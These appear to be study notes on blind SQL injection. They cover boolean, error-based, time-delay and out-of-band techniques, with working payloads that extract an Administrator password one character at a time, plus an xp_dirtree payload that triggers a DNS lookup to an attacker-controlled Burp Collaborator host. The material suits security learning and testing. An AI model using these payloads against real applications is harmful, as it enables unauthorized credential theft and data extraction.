--- ---

<h2>Blind SQL Injection</h2>

Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Exploiting Blind SQL Injection by Triggering Conditional Responses
- Cookie Header Example:
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
- When a request containing TrackingId cookie is processed, application determines whether this is a known user with a SQL query
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Suppose there is a table called Users with the columns Username and Password, and a user called Administrator. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
- "Welcome Back" message means the first character of the password is greater than "m"
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
- Does not return "Welcome Back" meaning the first character is NOT greater than "t"
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
- Returns "Welcome Back" meaning the password begins with "s"

-------------

<h2>Inducing Conditional Responses by Triggering SQL Errors</h2>
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a

xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

- Uses the "CASE" keyword to test a condition and return a different expression depending on if it's true
- First input, CASE evaluates to 'a' with no errores
- Second input, CASE evaluates to 1/0 which causes a divide-by-zero error
- Use the error response to determine if the character is valid

----------

<h2>Exploiting Blind SQL Injection by Triggering Time Delays</h2>

It is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received

- Testing on Microsoft SQL Server:
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--

'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- First input will not cause a delay because 1=2 is false
- Second input will cause a 10 second delay because 1=1 is true

---------

<h2>Exploiting Blind SQL Injection Using Out-Of-Band (OAST) Techniques</h2>

Trigger blind SQL injection vulnerability by triggering out-of-band network interactions to a system you control often via DNS
- Performed with Burp Collaborator (need Burp Suite Professional)
- Input for Microsoft SQL
```
'; exec master..xp_dirtree
'//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

- Causes the database to perform a lookup for the following domain - 0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
- Use "Collaborator Client" to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur